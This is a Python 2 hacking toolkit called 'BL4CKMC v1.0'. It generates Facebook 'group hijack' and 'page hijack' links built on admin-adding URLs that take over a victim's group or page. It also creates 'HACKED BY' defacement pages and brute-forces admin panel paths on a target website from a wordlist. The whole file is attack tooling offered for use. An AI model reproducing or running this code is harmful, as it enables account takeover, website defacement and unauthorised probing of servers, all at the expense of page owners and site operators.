#!/usr/bin/env python
# Autor : Michael Doruelo
# Tool Name : BL4CKMC v1.0
# Dont change this code :D

import os
import requests
from time import sleep

def facebook_group_hijack():
 print """
      \033[1;35m[+] \033[1;36mFacebook group hijack \033[1;35m[+]
 """
 group_id = raw_input("\033[1;33mGroup target ex[151470102024794] \033[1;31m>\033[1;37m ")
 user_id = raw_input("\033[1;33mUser id ex[100043457799306] \033[1;31m>\033[1;37m ")
 print "\033[1;36m[*] Generate link..."
 sleep(1.7)
 if group_id and user_id:
  linkhijack = "https://m.facebook.com/group/add_admin/?group_id="+group_id+"&user_id="+user_id+"&added&_rdrChange"
  try:
   file = open("files/fb_group_hijack_link.txt", 'w')
   file.write(linkhijack)
   file.close()
  except IOError, e:
   print "\033[31mError :", e
  else:
   print "\033[1;31mGroup Target \033[1;32m=> \033[1;33m"+group_id
   sleep(0.5)
   print "\033[1;31mUser id \033[1;32m=> \033[1;33m"+user_id
   sleep(1.0)
   print "\033[1;35mLink hijack \033[1;32m=> \033[1;36m"+linkhijack
   sleep(0.1)
 else:
  print "\033[1;31mField."

def facebook_page_hijack():
 print """
      \033[1;35m[+] \033[1;36mFacebook page hijack \033[1;35m[+]
 """
 page_id = raw_input("\033[1;33mPage target ex[123738289024998] \033[1;31m>\033[1;37m ")
 user_id = raw_input("\033[1;33mUser id ex[100043457799306] \033[1;31m>\033[1;37m ")
 print "\033[1;36m[*] Generate link..."
 sleep(1.7)
 if page_id and user_id:
  linkhijack = "https://m.facebook.com/pages/edit/admins/"+page_id+"?updates_status=1&admin_role=0&id="+user_id
  try:
   file = open("files/fb_page_hijack_link.txt", 'w')
   file.write(linkhijack)
   file.close()
  except IOError, e:
   print "\033[31mError :", e
  else:
   print "\033[1;31mPage Target \033[1;32m=> \033[1;33m"+page_id
   sleep(0.5)
   print "\033[1;31mUser id \033[1;32m=> \033[1;33m"+user_id
   sleep(1.0)
   print "\033[1;35mLink hijack \033[1;32m=> \033[1;36m"+linkhijack
   sleep(0.1)
 else:
  print "\033[1;31mField."
def deface_page_maker():
 print """
        \033[1;35m[+] \033[1;36mDeface page maker \033[1;35m[+]
 """
 script_name = raw_input("\033[1;33m(Script name)\033[1;31m>\033[1;37m ")
 hackedby = raw_input("\033[1;33m(Hacked by )\033[1;31m>\033[1;37m ")
 messange = raw_input("\033[1;33m(Message)\033[1;31m>\033[1;37m ")
 greetings = raw_input("\033[1;33m(Greetings)\033[1;31m>\033[1;37m ")
 
 deface_page = """
<!DOCTYPE HTML>
<html lang="en">
 <head>
  <title>HACKED BY """+hackedby+"""</title>
  <style>
   html {
   	 background: #000;
   	 color: #FFF;
   }
   h1 {
   	 font-family: serif;
   }
   p {
   	 font-family: monospace;
   }
  </style>
 </head>
 <body>
  <br /><br /><br />
  <center>
   <h1>HACKED BY """+hackedby+"""</h1>
   <p>
   Message:<br /><br />
   """+messange+"""
   <br /><br /><br />
   Greetings<br /><br />
   """+greetings+"""
   </p>
  </center>
 </body>
</html>
 """
 print "\033[1;36m[*] Creating deface page..."
 sleep(2.0)
 
 if script_name:
  try:
   file = open("files/Deface_Page/"+script_name+".html", 'w')
   file.write(deface_page)
  except IOError, e:
   print "\033[1;31mError :", e
  else:
   print "\033[1;33mSaved on \"files/Deface_Page/"+script_name+".html\" "
   print "\033[32mDone."
 else:
  print "\033[1;31mExit."

def admin_finder():
 print """
            \033[1;35m[+] \033[1;36mAdmin Panel finder \033[1;35m[+]
 """
 
 target_url = raw_input("\033[1;33mTarget url \033[1;31m>\033[1;37m ")
 target = target_url.replace("https://", "")
 target = target.replace("http://", "")
 target = "http://" + target
 
 if target_url:
  try:
   file = open("files/paths.txt", 'r')
  except IOError, e:
   print e
  else:
   for query in file:
    query = query.replace("\n", "")
    try:
     r = requests.get(target + query)
    except:
     print "\033[1;31mInvalid Url :("
    else:
     http = r.status_code
     if http == 200:
       print "\033[1;33m[ \033[32mFound :) \033[1;33m] \033[1;37m=> \033[1;34m" + target + query
     else:
       print "\033[1;33m[ \033[1;31mNot Found :( \033[1;33m] \033[1;37m=> \033[1;34m" + target + query
 else:
  print "\033[1;31mInvalid input!"
  
  
   
   
   
   
   
   